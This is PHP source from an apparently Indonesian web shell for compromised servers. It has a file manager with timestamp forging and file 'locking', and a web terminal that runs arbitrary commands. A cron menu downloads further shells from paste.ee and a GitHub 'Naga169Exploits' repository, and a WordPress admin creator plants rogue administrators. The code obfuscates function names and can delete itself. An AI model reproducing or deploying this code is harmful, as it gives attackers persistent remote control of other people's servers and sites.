                <li><a href="?menu=terminal&path=<?php echo urlencode($current_path); ?>" class="<?php echo ($active_menu === 'terminal' ? 'active' : ''); ?>">Web Terminal</a></li>
                <li><a href="?menu=cron&path=<?php echo urlencode($current_path); ?>" class="<?php echo ($active_menu === 'cron' ? 'active' : ''); ?>">Cron Job Setup</a></li>
                <li><a href="?menu=wp_admin_creator&path=<?php echo urlencode($current_path); ?>" class="<?php echo ($active_menu === 'wp_admin_creator' ? 'active' : ''); ?>">WP Admin Creator</a></li>
                <li><a href="?menu=webshell_scanner&path=<?php echo urlencode($current_path); ?>" class="<?php echo ($active_menu === 'webshell_scanner' ? 'active' : ''); ?>">Webshell Scanner</a></li>
            </ul>
        </aside>
        <main class="content-area">
            <?php
            if (!empty($output_messages) && !($active_menu === 'wp_admin_creator' && !empty($wp_admin_feedback_text)) ) { echo "<div class='message success'>" . implode("<br>", $output_messages) . "</div>"; }
            if (!empty($error_messages) && !($active_menu === 'wp_admin_creator' && !empty($wp_admin_feedback_text)) ) { echo "<div class='message error'>" . implode("<br>", $error_messages) . "</div>"; }
            if ($self_destruct && empty($error_messages) && $active_menu === 'cron') {
                $register_shutdown_fn_html_sd_main_page_final_full_complete = _get_fn_name_global_init_v3('_g_ascii_register_shutdown_function', 'register_shutdown_function');
                $unlink_fn_html_sd_main_page_final_full_complete = _get_fn_name_global_init_v3('_g_ascii_unlink', 'unlink');
                if(!empty($register_shutdown_fn_html_sd_main_page_final_full_complete) && call_user_func($function_exists_fn, $register_shutdown_fn_html_sd_main_page_final_full_complete) && !empty($unlink_fn_html_sd_main_page_final_full_complete) && call_user_func($function_exists_fn, $unlink_fn_html_sd_main_page_final_full_complete)) {
                     @call_user_func($register_shutdown_fn_html_sd_main_page_final_full_complete, $unlink_fn_html_sd_main_page_final_full_complete, __FILE__);
                }
            }
            ?>

            <?php if ($active_menu === 'explorer'): ?>
            <section class="content-section file-explorer">
                <h1>FILE EXPLORER</h1>
                <form method="get" action="<?php echo call_user_func($htmlspecialchars_fn, $_SERVER['PHP_SELF']); ?>" class="path-navigation-form">
                    <input type="hidden" name="menu" value="explorer">
                    <label for="path_explorer">Path:</label>
                    <input type="text" id="path_explorer" name="path" value="<?php echo call_user_func($htmlspecialchars_fn, $current_path); ?>" style="flex-grow:1;">
                    <input type="submit" value="Go">
                    <label for="search_explorer" style="margin-left: 15px;">Search:</label>
                    <input type="text" id="search_explorer" name="search" value="<?php echo call_user_func($htmlspecialchars_fn, isset($_GET['search']) ? $_GET['search'] : ''); ?>" placeholder="Filter names...">
                    <input type="submit" value="Search">
                </form>
                
                <form method="post" action="?menu=explorer&path=<?php echo urlencode($current_path); ?>" id="bulk-action-form">
                    <input type="hidden" name="action" value="bulk_action">

                    <table>
                        <thead>
                            <tr>
                                <th class="checkbox-col"><input type="checkbox" id="select-all-checkbox"></th>
                                <?php
                                $search_query_param = isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '';
                                function buildSortLink($label, $sort_key, $current_sort, $current_dir) {
                                    global $current_path, $search_query_param;
                                    $dir = ($current_sort === $sort_key && $current_dir === 'asc') ? 'desc' : 'asc';
                                    $arrow = $current_sort === $sort_key ? ($current_dir === 'asc' ? ' &uarr;' : ' &darr;') : '';
                                    return '<a href="?menu=explorer&path=' . urlencode($current_path) . '&sort_by=' . $sort_key . '&sort_dir=' . $dir . $search_query_param . '">' . $label . $arrow . '</a>';
                                }
                                $sort_by = isset($_GET['sort_by']) ? $_GET['sort_by'] : 'name';
                                $sort_dir = (isset($_GET['sort_dir']) && strtolower($_GET['sort_dir']) === 'desc') ? 'desc' : 'asc';
                                ?>
                                <th><?php echo buildSortLink('Name', 'name', $sort_by, $sort_dir); ?> / <?php echo buildSortLink('Ext', 'ext', $sort_by, $sort_dir); ?></th>
                                <th>Type</th>
                                <th><?php echo buildSortLink('Size', 'size', $sort_by, $sort_dir); ?></th>
                                <th>Permissions</th>
                                <th>Owner/Group</th>
                                <th><?php echo buildSortLink('Last Modified', 'modified', $sort_by, $sort_dir); ?></th>
                                <th class="actions-col">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $search_query = isset($_GET['search']) ? call_user_func($trim_fn, $_GET['search']) : '';
                            $real_current_path_fe_html_page_final_full_complete = (call_user_func($function_exists_fn, $realpath_fn) ? @call_user_func($realpath_fn, $current_path) : $current_path);
                            $real_parent_dir_fe_html_page_final_full_complete = (call_user_func($function_exists_fn, $realpath_fn) ? @call_user_func($realpath_fn, call_user_func($dirname_fn, $current_path)) : call_user_func($dirname_fn, $current_path));
                            if ($real_current_path_fe_html_page_final_full_complete && $real_parent_dir_fe_html_page_final_full_complete && $real_current_path_fe_html_page_final_full_complete !== $real_parent_dir_fe_html_page_final_full_complete) {
                                echo '<tr><td class="checkbox-col"></td><td class="name-col"><a href="?menu=explorer&path=' . urlencode($real_parent_dir_fe_html_page_final_full_complete) . '&sort_by='.$sort_by.'&sort_dir='.$sort_dir. $search_query_param.'" class="dir-link">..</a></td><td>DIR</td><td>-</td><td>-</td><td>-</td><td>-</td><td>&nbsp;</td></tr>';
                            }
                            
                            $items_fe_table_html_page_final_full_complete = listDirectory($current_path);
                            $all_items = array_merge($items_fe_table_html_page_final_full_complete['dirs'], $items_fe_table_html_page_final_full_complete['files']);

                            if (!empty($search_query)) {
                                $all_items = array_filter($all_items, function($item) use ($search_query) {
                                    return stripos($item['raw_name'], $search_query) !== false;
                                });
                            }

                            usort($all_items, function($a, $b) use ($sort_by, $sort_dir) {
                                $direction = ($sort_dir === 'asc') ? 1 : -1;
                                
                                if ($sort_by === 'name' || $sort_by === 'ext') {
                                    if ($a['type'] === 'dir' && $b['type'] !== 'dir') return -1;
                                    if ($a['type'] !== 'dir' && $b['type'] === 'dir') return 1;
                                }

                                switch ($sort_by) {
                                    case 'size':
                                        return ($a['raw_size'] <=> $b['raw_size']) * $direction;
                                    case 'modified':
                                        return ($a['raw_modified'] <=> $b['raw_modified']) * $direction;
                                    case 'ext':
                                        $ext_a = pathinfo($a['raw_name'], PATHINFO_EXTENSION);
                                        $ext_b = pathinfo($b['raw_name'], PATHINFO_EXTENSION);
                                        return strcasecmp($ext_a, $ext_b) * $direction;
                                    case 'name':
                                    default:
                                        return strcasecmp($a['raw_name'], $b['raw_name']) * $direction;
                                }
                            });
                            
                            if (!empty($all_items)) {
                                foreach ($all_items as $item) {
                                    echo '<tr>';
                                    echo '<td class="checkbox-col"><input type="checkbox" name="selected_items[]" value="' . $item['raw_name'] . '" class="item-checkbox"></td>';

                                    if ($item['type'] === 'dir') {
                                        echo '<td class="name-col"><a href="?menu=explorer&path=' . urlencode($item['path']) . '&sort_by='.$sort_by.'&sort_dir='.$sort_dir. $search_query_param .'" class="dir-link">' . $item['name'] . '</a></td>';
                                    } else {
                                        echo '<td class="name-col">' . $item['name'] . '</td>';
                                    }
                                    echo '<td>' . $item['type'] . '</td><td>' . $item['size'] . '</td>';
                                    
                                    $item_path_loop = $item['path'];
                                    $perms_val = $item['perms'];
                                    $color = !@is_readable($item_path_loop) ? 'red' : (!@is_writable($item_path_loop) ? 'white' : '');
                                    $perms_display_html = '<a href="#" onclick="changePerms(\'' . urlencode($item['raw_name']) . '\', \'' . $perms_val . '\')" style="' . ($color ? 'color:' . $color . ';' : '') . ' text-decoration: underline; cursor: pointer;">' . $perms_val . '</a>';
                                    echo '<td>' . $perms_display_html . '</td>';
                                    
                                    echo '<td>' . call_user_func($htmlspecialchars_fn, $item['owner']) . '/' . call_user_func($htmlspecialchars_fn, $item['group']) . '</td>';

                                    $mtime_display_html = '<a href="#" onclick="changeMtime(\''.urlencode($item['raw_name']).'\', \''.$item['modified'].'\')" style="text-decoration: underline; cursor:pointer;">'.$item['modified'].'</a>';
                                    echo '<td>' . $mtime_display_html . '</td>';

                                    echo '<td class="actions-col">';
                                    if ($item['type'] === 'file') {
                                        echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=edit&target=' . urlencode($item['raw_name']) . '" class="action-btn">Edit</a> ';
                                    }
                                    echo '<a href="#" onclick="renameItem(\'' . urlencode($current_path) . '\', \'' . urlencode($item['raw_name']) . '\', \'' . addslashes($item['name']) . '\')" class="action-btn">Rename</a> ';
                                    echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=delete&target=' . urlencode($item['raw_name']) . '" onclick="return confirmDelete(\'' . addslashes($item['name']) . '\')" class="action-btn">Delete</a> ';
                                    if ($item['type'] === 'file') {
                                        echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=download&target=' . urlencode($item['raw_name']) . '" class="action-btn">Download</a> ';
                                        if (strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)) === 'zip') {
                                            echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=unzip&target=' . urlencode($item['raw_name']) . '" class="action-btn">Unzip</a> ';
                                        }
                                        echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=lock&target=' . urlencode($item['raw_name']) . '" onclick="return confirm(\'Anda yakin ingin mengunci file \\\'' . addslashes($item['name']) . '\\\'? Ini akan membuat proses background permanen.\')" class="action-btn">Lock</a>';
                                    }
                                    echo '</td></tr>';
                                }
                            } else {
                                echo '<tr><td colspan="8"><em>' . (!empty($search_query) ? 'Tidak ada item yang cocok dengan pencarian.' : 'Direktori kosong atau tidak dapat diakses.') . '</em></td></tr>';
                            } ?>
                        </tbody>
                    </table>

                    <div class="bulk-actions-bar">
                        <span>Dengan yang dipilih:</span>
                        <select name="bulk_operation">
                            <option value="">--Pilih Aksi--</option>
                            <option value="delete">Hapus</option>
                            <option value="zip">Zip</option>
                        </select>
                        <input type="text" name="zip_filename" placeholder="archive.zip">
                        <button type="submit">Terapkan</button>
                    </div>
                </form>
            </section>
            <?php endif; ?>

            <?php if ($active_menu === 'editor' && isset($_GET['target'])):
                $file_to_edit_basename_editor_html_page_section_final_full_editor_html = call_user_func($basename_fn, $_GET['target']);
                $file_to_edit_path_editor_html_page_section_final_full_editor_html = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_edit_basename_editor_html_page_section_final_full_editor_html;
                $file_content_editor_html_page_section_final_full_editor_html = ''; $can_edit_editor_html_page_section_final_full_editor_html = false; $error_edit_page_editor_html_page_section_final_full_editor_html = '';
                $file_exists_editor_html_page_section_final_full_editor_html = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
                $is_readable_editor_html_page_section_final_full_editor_html = _get_fn_name_global_init_v3('_g_ascii_is_readable','is_readable');
                $file_get_contents_editor_html_page_section_final_full_editor_html = _get_fn_name_global_init_v3('_g_ascii_file_get_contents','file_get_contents');
                $is_writable_editor_html_page_section_final_full_editor_html = _get_fn_name_global_init_v3('_g_ascii_is_writable','is_writable');
                if (!empty($file_exists_editor_html_page_section_final_full_editor_html) && call_user_func($file_exists_editor_html_page_section_final_full_editor_html, $file_to_edit_path_editor_html_page_section_final_full_editor_html) && !call_user_func($is_dir_fn, $file_to_edit_path_editor_html_page_section_final_full_editor_html)) {
                    if (!empty($is_readable_editor_html_page_section_final_full_editor_html) && @call_user_func($is_readable_editor_html_page_section_final_full_editor_html, $file_to_edit_path_editor_html_page_section_final_full_editor_html)) {
                        $file_content_editor_html_page_section_final_full_editor_html = (!empty($file_get_contents_editor_html_page_section_final_full_editor_html) && call_user_func($function_exists_fn, $file_get_contents_editor_html_page_section_final_full_editor_html)) ? @call_user_func($file_get_contents_editor_html_page_section_final_full_editor_html, $file_to_edit_path_editor_html_page_section_final_full_editor_html) : 'Error: file_get_contents not available.';
                        if ($file_content_editor_html_page_section_final_full_editor_html === false) $error_edit_page_editor_html_page_section_final_full_editor_html = "Gagal membaca konten file.";
                        $can_edit_editor_html_page_section_final_full_editor_html = (!empty($is_writable_editor_html_page_section_final_full_editor_html) && @call_user_func($is_writable_editor_html_page_section_final_full_editor_html, $file_to_edit_path_editor_html_page_section_final_full_editor_html));
                    } else { $error_edit_page_editor_html_page_section_final_full_editor_html = "File tidak readable."; }
                } else { $error_edit_page_editor_html_page_section_final_full_editor_html = "File tidak ditemukan atau adalah direktori."; }
            ?>
            <section class="content-section">
                <h1>EDIT FILE: <?php echo call_user_func($htmlspecialchars_fn, $file_to_edit_basename_editor_html_page_section_final_full_editor_html); ?></h1>
                <?php if (!empty($error_edit_page_editor_html_page_section_final_full_editor_html)): ?> <p style="color:#ff4444;"><?php echo call_user_func($htmlspecialchars_fn, $error_edit_page_editor_html_page_section_final_full_editor_html); ?></p>
                <?php elseif ($file_content_editor_html_page_section_final_full_editor_html !== false): ?>
                <form method="post" action="<?php echo call_user_func($htmlspecialchars_fn, $_SERVER['PHP_SELF']); ?>?menu=editor&path=<?php echo urlencode($current_path); ?>&target=<?php echo urlencode($file_to_edit_basename_editor_html_page_section_final_full_editor_html); ?>">
                    <input type="hidden" name="file_to_edit_path" value="<?php echo call_user_func($htmlspecialchars_fn, $file_to_edit_path_editor_html_page_section_final_full_editor_html); ?>">
                    <textarea name="file_content" <?php if (!$can_edit_editor_html_page_section_final_full_editor_html) echo 'readonly'; ?>><?php echo call_user_func($htmlspecialchars_fn, $file_content_editor_html_page_section_final_full_editor_html); ?></textarea>
                    <?php if ($can_edit_editor_html_page_section_final_full_editor_html): ?> <input type="submit" name="save_file_content" value="SAVE CHANGES" class="full-width">
                    <?php else: ?> <p style="color:#ff4444;"><em>File is not writable.</em></p> <?php endif; ?>
                </form>
                <?php endif; ?>
                <p><a href="?menu=explorer&path=<?php echo urlencode($current_path); ?>">&laquo; Back to File Explorer</a></p>
            </section>
            <?php endif; ?>

            <?php if ($active_menu === 'terminal'): ?>
            <section class="content-section" style="padding: 0; background: none; border: none; box-shadow: none;">
                <?php
                // ------------- START NEW TERMINAL CODE (REFACTORED FOR GLOBAL AUTH) -------------

                if (isset($current_path)) {
                    $_SESSION['cwd'] = $current_path;
                }

                if (!isset($_SESSION['cwd'])) {
                    $_SESSION['cwd'] = call_user_func($getcwd_fn);
                }
                if (!isset($_SESSION['history'])) {
                    $_SESSION['history'] = [['cmd' => 'Login Berhasil', 'out' => 'Ketik `help` untuk bantuan.', 'cwd' => $_SESSION['cwd']]];
                }

                function terminal_execute_command($command, $cwd) {
                    if (!function_exists('proc_open')) {
                        return "ERROR KEAMANAN: Fungsi `proc_open` dinonaktifkan di server ini. Perintah shell tidak dapat dijalankan.";
                    }
                    $descriptorspec = [
                       0 => ["pipe", "r"],
                       1 => ["pipe", "w"],
                       2 => ["pipe", "w"]
                    ];
                    $env = array_merge($_SERVER, $_ENV);
                    $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
                    $output = '';
                    $error = '';

                    if (is_resource($process)) {
                        fclose($pipes[0]);
                        $output = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        $error = stream_get_contents($pipes[2]); 
                        fclose($pipes[2]);
                        proc_close($process);
                    } else {
                       $error = "Gagal mengeksekusi perintah. Fungsi `proc_open` mungkin dinonaktifkan.";
                    }
                    return trim($error . "\n" . $output);
                }

                function terminal_get_prompt($cwd) {
                    static $user = null;
                    static $host = null;
                    if ($user === null) { 
                       $user_cmd = function_exists('posix_getpwuid') && function_exists('posix_geteuid') 
                                   ? posix_getpwuid(posix_geteuid())['name'] 
                                   : terminal_execute_command('whoami', getcwd());
                       $user = trim($user_cmd);
                    }
                    if ($host === null) {
                        $host = gethostname();
                        if ($host === false) $host = 'localhost';
                    }
                    
                    $home = getenv('HOME');
                    if(!empty($home) && strpos($cwd, $home) === 0){
                        $cwd_display = '~' . substr($cwd, strlen($home));
                    } else {
                        $cwd_display = $cwd;
                    }
                    return htmlspecialchars($user . '@' . $host . ':' . $cwd_display . '$');
                }
                    
                $terminal_output = '';
                $command = '';
                $terminal_current_cwd = $_SESSION['cwd']; 

                if (isset($_POST['cancel_edit'])) {
                    unset($_SESSION['edit_file']);
                }
                elseif (isset($_POST['save_file'], $_SESSION['edit_file'])) {
                    $file_path = $_SESSION['edit_file'];
                    $content = $_POST['file_content'] ?? '';
                    if (is_writable(dirname($file_path))) {
                        if (file_put_contents($file_path, $content) !== false) {
                            $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'File ' . basename($file_path) . ' berhasil disimpan.', 'cwd' => $terminal_current_cwd];
                        } else {
                            $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'GAGAL menyimpan file ' . basename($file_path) . '. Periksa hak akses file.', 'cwd' => $terminal_current_cwd];
                        }
                    } else {
                        $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'GAGAL menyimpan file ' . basename($file_path) . '. Direktori tidak dapat ditulis.', 'cwd' => $terminal_current_cwd];
                    }
                    unset($_SESSION['edit_file']);
                }
                elseif (isset($_POST['cmd']) && !isset($_SESSION['edit_file'])) {
                    $command = trim($_POST['cmd']);
                    if (empty($command) && isset($_POST['cmd'])) {
                       $_SESSION['history'][] = ['cmd' => '', 'out' => '', 'cwd' => $terminal_current_cwd];
                    } else if (strtolower($command) === 'logout'){
                        $_SESSION['history'][] = ['cmd' => 'logout', 'out' => 'Logging out...', 'cwd' => $terminal_current_cwd];
                        echo '<script>window.location.href="?logout=1";</script>';
                        exit();
                    } else {
                        $parts = explode(' ', $command, 2);
                        $cmd_base = strtolower($parts[0]);
                        $cmd_arg = $parts[1] ?? '';
                        
                        switch ($cmd_base) {
                            case 'clear':
                                $_SESSION['history'] = [];
                                break;
                                
                            case 'cd':
                                $target_dir = empty($cmd_arg) ? (getenv('HOME') ?: $terminal_current_cwd) : $cmd_arg;
                                $new_path = (substr($target_dir, 0, 1) === DIRECTORY_SEPARATOR || (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:\\\\/', $target_dir))) 
                                          ? $target_dir 
                                          : $terminal_current_cwd . DIRECTORY_SEPARATOR . $target_dir;
                                
                                $resolved_path = realpath($new_path);

                                if ($resolved_path !== false && is_dir($resolved_path) && is_readable($resolved_path)) {
                                    $_SESSION['cwd'] = $resolved_path;
                                    $_SESSION['current_explorer_path'] = $resolved_path;
                                    $terminal_output = '';
                                } else {
                                    $terminal_output = 'cd: Error: Direktori `'. htmlspecialchars($target_dir).'` tidak ditemukan atau tidak dapat diakses.';
                                }
                                $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $_SESSION['cwd']];
                                break;

                            case 'edit':
                                if (!empty($cmd_arg)) {
                                    $file_path = $terminal_current_cwd . DIRECTORY_SEPARATOR . $cmd_arg;
                                    if ( (file_exists($file_path) && is_readable($file_path) && is_file($file_path)) || (!file_exists($file_path) && is_writable($terminal_current_cwd)) ) {
                                        $_SESSION['edit_file'] = $file_path;
                                    } else {
                                        $terminal_output = 'edit: Error: File tidak ditemukan, bukan file biasa, tidak dapat dibaca, atau direktori tidak dapat ditulis.';
                                        $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd];
                                    }
                                } else {
                                    $terminal_output = 'edit: Gunakan: edit <namafile>';
                                    $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd];
                                }
                                break;

                            case 'help':
                                $terminal_output = "Perintah Bawaan PHP Terminal:\n" .
                                  "  cd <dir>        - Pindah direktori (cd tanpa argumen = ke home).\n" .
                                  "  edit <file>     - Mengedit file teks (membuat baru jika belum ada & direktori writable).\n" .
                                  "  clear           - Membersihkan layar riwayat.\n" .
                                  "  logout          - Keluar dari terminal.\n" .
                                  "  help            - Menampilkan bantuan ini.\n\n" .
                                  "CATATAN KEAMANAN: Segera hapus file ini setelah selesai digunakan!\n".
                                  "CATATAN CRONTAB : crontab -e, nano, vi, top tidak akan berfungsi. Gunakan metode `echo > file` lalu `crontab file`.";
                                $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd];
                                break;
                                
                            default:
                                $terminal_output = terminal_execute_command($command, $terminal_current_cwd);

                                if (preg_match('/^crontab\s+-l$/i', $command) && empty(trim($terminal_output))) {
                                    $crontab_exists = !empty(trim(terminal_execute_command('command -v crontab', $terminal_current_cwd)));
                                    $terminal_output  = "[Info PHP Terminal]: Hasil `crontab -l` kosong.\n\n";
                                    if ($crontab_exists) {
                                        $terminal_output .= "1. Perintah `crontab` TERSEDIA di server.\n";
                                        $terminal_output .= "2. Saat ini TIDAK ADA cron job yang terjadwal untuk user ini (`" . trim(terminal_execute_command('whoami', $terminal_current_cwd)) ."`).\n\n";
                                        $terminal_output .= "CARA MENAMBAH CRON JOB:\n";
                                        $terminal_output .= "  a) Cari path PHP: which php\n";
                                        $terminal_output .= "  b) Buat file    : echo \"* * * * * /path/php/anda /path/script/anda.php\" > myjobs.txt\n";
                                        $terminal_output .= "  c) Load file    : crontab myjobs.txt\n";
                                        $terminal_output .= "  d) Cek lagi     : crontab -l";
                                    } else {
                                        $terminal_output .= "Perintah `crontab` tampaknya TIDAK TERSEDIA atau tidak ada dalam PATH user webserver.";
                                    }
                                }
                                $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd];
                        }
                    }
                }
                ?>
                <style>
                    .terminal-body { background-color: #1e1e1e; color: #d4d4d4; font-family: 'Consolas', 'Menlo', 'Courier New', monospace; font-size: 14px; line-height: 1.4; }
                    .terminal-container { padding: 0; box-sizing: border-box; }
                    .terminal-h1 { color: #569cd6; border-bottom: 1px solid #444; padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; margin-top:0; font-size: 1.2em }
                    .terminal-h1 a { color: #ce9178; text-decoration: none; font-size: 0.9em; }
                    .terminal-display { background-color: #252526; border: 1px solid #444; border-radius: 4px; padding: 10px; min-height: 200px; max-height: calc(100vh - 280px); overflow-y: auto; margin-bottom: 10px;}
                    .history-item { margin-bottom: 5px; }
                    .prompt-line { display: flex; align-items: baseline; }
                    .prompt { color: #4ec9b0; margin-right: 8px; flex-shrink: 0; white-space: nowrap;}
                    .command { color: #dcdcaa; word-break: break-all; }
                    pre.output { margin: 5px 0 15px 0; padding-left: 10px; border-left: 2px solid #3c3c3c; white-space: pre-wrap; word-wrap: break-word; color: #cccccc; background: none; border-radius: 0; font-family: inherit;}
                    .input-line { display: flex; align-items: baseline; width: 100%; background-color: #333; padding: 5px; border-radius: 3px; box-sizing: border-box;}
                    #cmd_input { flex-grow: 1; background-color: transparent; border: none; color: #d4d4d4; font-family: inherit; font-size: inherit; outline: none; padding: 0 0 0 5px; height: 1.4em; }
                    .terminal-body textarea { width: 100%; height: calc(100vh - 280px); background-color: #252526; border: 1px solid #444; color: #d4d4d4; font-family: inherit; font-size: inherit; padding: 10px; box-sizing: border-box; margin-top: 10px; resize: vertical; }
                    .edit-info { margin-bottom: 5px; color: #dcdcaa; }
                    .btn-area button { background-color: #007acc; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; margin-top: 10px; margin-right: 10px; font-family: inherit;}
                    .btn-area button:hover { opacity: 0.8; }
                </style>
                <div class="terminal-body">
                    <div class="terminal-container">
                        <h1 class="terminal-h1">Web Terminal</h1>

                        <?php if (isset($_SESSION['edit_file'])): ?>
                            <?php $is_new = !is_file($_SESSION['edit_file']); ?>
                            <div class="edit-info">Mengedit: <code><?= htmlspecialchars($_SESSION['edit_file']) ?></code> (<?= $is_new ? 'File Baru' : 'File Lama' ?>)</div>
                            <form method="POST" action="?menu=terminal&path=<?= urlencode($current_path) ?>">
                                <textarea name="file_content"><?= $is_new ? '' : htmlspecialchars(file_get_contents($_SESSION['edit_file'])) ?></textarea>
                                <div class="btn-area">
                                <button type="submit" name="save_file" value="1">Simpan Perubahan</button>
                                <button type="submit" name="cancel_edit" value="1" style="background-color:#555">Batal</button>
                                </div>
                            </form>
                        <?php else: ?>
                            <div class="terminal-display" id="terminalBox">
                                <?php 
                                $max_history = 200;
                                if (count($_SESSION['history']) > $max_history) {
                                    $_SESSION['history'] = array_slice($_SESSION['history'], -$max_history);
                                }
                                foreach ($_SESSION['history'] as $item): ?>
                                    <div class="history-item">
                                        <div class="prompt-line">
                                            <span class="prompt"><?= terminal_get_prompt($item['cwd']) ?></span>
                                            <span class="command"><?= htmlspecialchars($item['cmd']) ?></span>
                                        </div>
                                        <?php if (isset($item['out']) && $item['out'] !== ''): ?>
                                        <pre class="output"><?= htmlspecialchars($item['out']) ?></pre>
                                        <?php endif; ?>
                                    </div>
                                <?php endforeach; ?>
                            </div>
                            
                            <form method="POST" action="?menu=terminal&path=<?= urlencode($current_path) ?>">
                                <div class="input-line">
                                    <label for="cmd_input" class="prompt"><?= terminal_get_prompt($terminal_current_cwd) ?></label>
                                    <input type="text" id="cmd_input" name="cmd" autofocus autocomplete="off" spellcheck="false">
                                    <input type="submit" style="display:none;">
                                </div>
                            </form>
                        <?php endif; ?>
                    </div>
                    <script>
                        document.addEventListener("DOMContentLoaded", function() {
                            var terminalBox = document.getElementById('terminalBox');
                            if (terminalBox) {
                                terminalBox.scrollTop = terminalBox.scrollHeight;
                            }
                            var cmdInput = document.getElementById('cmd_input');
                            var editArea = document.querySelector('.terminal-body textarea');
                            
                            if (cmdInput) {
                                cmdInput.focus();
                                if (terminalBox) {
                                    terminalBox.addEventListener('click', function() { cmdInput.focus(); });
                                }
                            } else if (editArea) {
                                editArea.focus();
                            }
                        });
                    </script>
                </div>
                <?php // ------------- END NEW TERMINAL CODE ------------- ?>
            </section>
            <?php endif; ?>

            <?php if ($active_menu === 'cron'): ?>
            <section class="content-section">
                 <h1>CRON JOB SETUP</h1>
                <form method="post" action="<?php echo call_user_func($htmlspecialchars_fn, $_SERVER['PHP_SELF']); ?>?menu=cron&path=<?php echo urlencode($auto_path_script); ?>">
                    <input type="hidden" name="action" value="setup_cron">
                    <label for="path_cron_display">Path Target Cron (Auto):</label>
                    <input type="text" id="path_cron_display" value="<?php echo call_user_func($htmlspecialchars_fn, $auto_path_script); ?>" readonly>
                    <label for="shell_filename_cron">Nama File Shell Cron:</label>
                    <input type="text" id="shell_filename_cron" name="shell_filename_cron" placeholder="index.php" value="<?php echo call_user_func($htmlspecialchars_fn, (isset($_POST['shell_filename_cron']) ? $_POST['shell_filename_cron'] : 'index.php')); ?>">
                    <label>Pilih Jenis Shell (URL Auto-Fill):</label>
                    <div class="shell-buttons">
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/ouiotmMb')">ALFA</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/HDilv6Nd')">Gecko</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/1j4B2KYH')">MR.Combet</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/NhqVqA9R')">TinyFile Manager</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/h1nRTJPS')">Bye Bye Litespeed</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://paste.ee/r/SKfpA9SZ')">Maling WP</button>
                        <button type="button" class="shell-button" onclick="setShellUrlForCron('https://raw.githubusercontent.com/naga169-resmi/Naga169Exploits/refs/heads/main/sebar-konten.php')">Sebar Akses Random</button>
                    </div>
                    <label for="url_cron_input">URL Raw Shell Cron (Kosongkan jika tidak set cron):</label>
                    <input type="url" id="url_cron_input" name="url_cron" placeholder="Input URL manual atau pilih dari atas" value="<?php echo call_user_func($htmlspecialchars_fn, (isset($_POST['url_cron']) ? $_POST['url_cron'] : '')); ?>">
                    <input type="submit" value="EXECUTE CRON SETUP" class="full-width">
                </form>
            </section>
            <?php endif; ?>

            <?php if ($active_menu === 'webshell_scanner'): ?>
            <section class="content-section webshell-scanner-section">
                <h1>WEBSHELL SCANNER</h1>
                <form method="post" action="?menu=webshell_scanner&path=<?php echo urlencode($current_path); ?>">
                    <input type="hidden" name="action" value="scan_webshells">
                    <label for="scan_dir_input">Direktori untuk Dipindai:</label>
                    <input type="text" id="scan_dir_input" name="scan_dir" value="<?php echo call_user_func($htmlspecialchars_fn, isset($_POST['scan_dir']) ? $_POST['scan_dir'] : call_user_func($getcwd_fn) ); ?>">
                    <p style="font-size:0.8em; color:#aaa;">Path default adalah direktori kerja saat ini. Pemindaian akan membaca semua file (termasuk .jpg, .txt, dll) dan bisa memakan waktu lama.</p>
                    <input type="submit" name="submit_scan" value="MULAI PINDAI" class="full-width">
                </form>
                <?php if (!empty($scanner_results_html)): ?>
                <div class="scanner-results">
                    <h2>Hasil Pemindaian:</h2>
                    <?php echo $scanner_results_html; ?>
                </div>
                <?php endif; ?>
            </section>
            <?php endif; ?>

            <?php if ($active_menu === 'wp_admin_creator'): ?>
            <section class="content-section">
                <h1>WP ADMIN CREATOR</h1>
                <?php
                $wp_load_path_display_html_page_creator_final_full_html = find_wp_load_path($auto_path_script);
                $can_show_wp_form_html_page_creator_final_full_html = false;
                $file_exists_wp_check_html_page_creator_final_full_html = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');

                if ($wp_load_path_display_html_page_creator_final_full_html && !empty($file_exists_wp_check_html_page_creator_final_full_html) && call_user_func($file_exists_wp_check_html_page_creator_final_full_html, $wp_load_path_display_html_page_creator_final_full_html)) {
                    if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', false);
                    ob_start(); $wp_loaded_check_html_page_creator_final_full_html = @include_once($wp_load_path_display_html_page_creator_final_full_html); ob_end_clean();
                    if ($wp_loaded_check_html_page_creator_final_full_html && function_exists('wp_nonce_field')) { $can_show_wp_form_html_page_creator_final_full_html = true; }
                    elseif (empty($wp_admin_feedback_text)) {
